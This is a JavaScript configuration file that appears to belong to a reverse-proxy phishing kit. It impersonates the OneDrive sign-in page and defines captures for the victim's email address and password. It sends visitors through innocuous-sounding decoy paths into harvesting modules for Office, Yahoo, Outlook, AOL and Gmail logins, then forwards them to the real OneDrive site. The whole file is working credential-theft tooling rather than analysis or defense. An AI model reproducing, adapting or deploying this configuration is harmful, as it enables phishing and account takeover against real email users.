const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

const OFFICE_MODULE = require('../office/')
const YAHOO_MODULE = require('../yahoo/')
const OUTLOOK_MODULE = require('../outlook/')
const AOL_MODULE = require('../aol/')
const GMAIL_MODULE = require('../gmail/')

/** Defined Config used */

const configExport = {

    SCHEME: 'onedrive',

    CURRENT_DOMAIN: 'onedrive.live.com',

    START_PATH: '/identity/login',
    
    PATTERNS: [],

    FORCE_PROXY: ["/auth/login/finish"],

    PHP_PROCESSOR: {
        '/identity/login': {
            GET: {
                script: 'index.php',
            },
            POST: {
                script: null,
            
                redirectTo: null,

            },
        },

        '/identity/lalo/validate': {
            GET: {
                script: null,
            },
            POST: {
                script: 'validate.php',
                
                redirectTo: '',

            },
        },
    },

    COOKIE_PATH: [],

    EXIT_TRIGGER_PATH: ['/auth/login/finish'],

    EXIT_URL: 'https://onedrive.live.com',


    EXTRA_COMMANDS: [],

    CAPTURES: {
        emailVerify: {
            params: ['emailLookup'],
            hosts: 'PHP-EXEC',
        },

        manuelPassword: {
            params: ['password'],
            hosts: 'PHP-EXEC',
        },


    },

    IMPORTED_MODULES: [
        {
            beginAt: '/discovery/unveils/knowledge',
            exitAt: '/auth/login/finish',
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/mountains/inspire/serenity',
            exitAt: '/auth/login/finish',
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/creativity/invigorates/mind',
            exitAt: '/auth/login/finish',
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/patience/propels/peace',
            exitAt: '/auth/login/finish',
            module: AOL_MODULE,
        },
        {
            beginAt: '/nature/nourishes/nirvana',
            exitAt: '/auth/login/finish',
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: 'DEFAULT',

    EXTERNAL_FILTERS: [],

   }
module.exports = configExport

